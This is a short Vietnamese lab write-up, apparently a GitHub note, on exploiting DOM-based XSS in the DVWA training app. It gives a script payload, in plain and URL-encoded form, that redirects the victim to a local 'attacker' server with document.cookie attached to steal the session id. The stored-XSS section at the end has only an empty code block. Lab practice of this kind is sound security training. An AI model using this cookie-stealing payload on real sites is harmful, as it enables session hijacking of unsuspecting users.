# XSS DOM
## Client / Server side
## Pwned Time
![image](https://github.com/user-attachments/assets/2b6ebd0c-6c76-4903-9305-b13b16b73757)
*Mình sẽ khai thác XSS trực tiếp trên client-side khác với XSS reflected khai thác qua server-side*

![image](https://github.com/user-attachments/assets/b5823528-483f-4285-a890-82c4ebb2de35)
*Thử nhập 1 lệnh alert*
--> Kết quả:
![image](https://github.com/user-attachments/assets/752634e3-7aba-43c7-945d-07c6b05c5136)

Pwn time:
1. Tạo 1 local server qua python (port 8000)
![image](https://github.com/user-attachments/assets/6a79af35-58fe-4de8-b9d7-77fb0ad444a4)

2. Tạo payload độc, lừa user nhập vào
Payload gốc:
```
127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
```
![image](https://github.com/user-attachments/assets/ee01b5a4-71a4-48cf-b0db-9b04016eaefc)
*Nó sẽ ra 1 trang ntn*

Encode payload:
```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A8000%2F%3Fcookie%3Ddocument.cookie%3C%2Fscript%3E
```
3. Kết quả
Session id của người dùng hiện trong cửa sổ server của attacker
 ![image](https://github.com/user-attachments/assets/71026905-c57d-471c-81db-891455ac4e22)

# XSS Stored
## Code backend
```php
```


